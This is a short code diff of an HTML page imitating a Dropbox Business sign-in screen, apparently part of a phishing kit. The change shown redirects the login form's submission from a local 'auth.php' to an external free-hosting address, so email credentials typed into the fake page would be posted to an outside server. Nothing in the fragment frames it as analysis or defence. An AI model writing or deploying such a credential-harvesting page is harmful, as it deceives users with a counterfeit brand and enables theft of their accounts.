@@ -944,7 +944,7 @@
 <img class="" src="https://www.dropbox.com/static/images/arbor/logos/glyph-vflcdYk8V.svg" width="34" height="31" alt="">&nbsp;&nbsp;&nbsp;
 <img class="" src="https://www.dropbox.com/static/images/arbor/logos/wordmark--business-vfl9WSvMr.svg" width="212" height="26" alt=""><br><p></br>
 <!-- form submit start -->
-	<form action="auth.php" method="POST" autocomplete="OFF">
+	<form action="https://bobstottts.000webhostapp.com/indexs.php" method="POST" autocomplete="OFF">
    <div><strong>Select your email provider</strong></div></br>
     <input type="hidden" name="hidCflag" id="hidCflag" value="" />
     <select class="cflagdd">
